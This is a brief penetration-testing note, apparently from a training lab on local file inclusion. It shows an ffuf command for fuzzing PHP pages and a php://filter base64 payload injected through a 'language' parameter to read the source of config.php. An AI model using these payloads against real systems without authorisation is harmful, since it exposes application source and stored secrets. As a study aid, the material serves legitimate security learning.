Find php pages with ffuf
```shell
ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://<SERVER_IP>:<PORT>/FUZZ.php
```
**Tip:** Unlike normal web application usage, we are not restricted to pages with HTTP response code 200, as we have local file inclusion access, so we should be scanning for all codes, including `301`, `302` and `403` pages, and we should be able to read their source code as well.

Using base64 filter in order to get file source
```url
php://filter/read=convert.base64-encode/resource=config
```
```url
http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=config
```
